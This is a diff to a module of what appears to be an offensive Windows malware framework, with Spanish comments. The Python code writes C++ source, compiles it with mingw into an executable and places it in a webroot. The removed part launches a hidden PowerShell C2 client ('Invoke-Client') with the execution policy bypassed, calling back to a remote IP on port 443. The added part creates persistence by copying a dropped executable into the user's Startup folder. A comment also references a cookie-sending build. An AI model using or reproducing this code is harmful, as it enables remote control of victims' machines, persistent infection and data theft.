@@ -13,76 +13,56 @@ class executing_payload(Module):
 	#MODULE OPTIONS
 	config  = Config({
         Option(
-            'PAYLOAD',
-            "Name of the ps1 payload.",
+            'ARCHIVO_PERSISTENCIA',
+            "Archivo que genera la persistencia en el sistema remoto.",
             True,
             #set_callback=lambda o: o.root._set_app_folder(),
-        ): "my_client",
-        Option(
-            'LHOST',
-            "Your IP address.",
-            True,
-            #set_callback=lambda o: o.root._set_logging(o.value),
-        ): "0.0.0.0",
-        Option(
-            'EXE_NAME',
-            "Name of the EXE.",
-            True,
-            #set_callback=lambda o: o.root._set_logging(o.value),
-        ): "name.c",
-		Option(
-            'OUTPUT',
-            "Path of the output folder.",
-            True,
-            #set_callback=lambda o: o.root._set_logging(o.value),
-        ): " ",
+        ): "persiste.exe"
     })
 
 	def run(self):
 		parent_path = "Prueba/sourcecodes/"
 		parent_webroot_path = "Prueba/webroot/"
 
-		c2client = ''.join(list(self.config.get('PAYLOAD')))
-		ipaddr   = ''.join(list(self.config.get('LHOST')))
-		name     = ''.join(list(self.config.get('EXE_NAME')))
-
-		c2client = "client.ps1"
-		ipaddr = "10.10.1.13"
-		name = 'ejecutarPSs.cpp'
+		archivo_origen = ''.join(list(self.config.get('ARCHIVO_PERSISTENCIA')))
+		archivo_origen = "persiste.exe"
+		
+		name = "persiste.cpp"
+		exename = "persiste"
 		fullname = parent_path+name
-		exename = "envia"
 		outfile = parent_webroot_path + exename
 		
 
 
-		STARTC2 = '''
+		PERSISTENCIA = '''
 		#include <iostream>
-		#include <winsock2.h>
 		#include <windows.h>
 		#include <string>
 		#pragma comment(lib, "urlmon.lib")
 		#include <lmcons.h>
 		#include <cstring>
-		#define PSSCRIPT "%s"
-		#define IPADDR "%s"
+		#define ORIGENARCHIVO "%s"
+		#define DESTINOPATH "AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"
 		using namespace std;
+		//compilar: i686-w64-mingw32-g++ persiste.cpp -o persiste -static-libgcc -static-libstdc++
 
 		int main(void){
-		       string nombre_script = PSSCRIPT;
-		       string ipaddr = IPADDR;
-		       char username[UNLEN+1];
-		       DWORD username_len = UNLEN+1;
-		       GetUserName(username, &username_len);
-		       string user(username);      
-		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
-		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\"";
-		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
+			char username[UNLEN+1];
+			DWORD username_len = UNLEN+1;
+			GetUserName(username, &username_len);
+			string user(username);
+			string file_name = ORIGENARCHIVO;
+			string origen_path = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + file_name;
+			string destino_path = "C:\\\\Users\\\\" + user + "\\\\" + DESTINOPATH;
+			string cmd = "COPY \\"" +  origen_path + "\\" \\"" + destino_path + "\\"";
+			//printf("CMD: %%s", cmd.c_str());
+			system(cmd.c_str());
 
 		}
-		''' % (c2client, ipaddr)
+		''' %  (archivo_origen)
 
 		f = open(fullname,"w")
-		f.write(STARTC2)
+		f.write(PERSISTENCIA)
 		print("Archivo "+ fullname + " creado.")
 		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
 		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
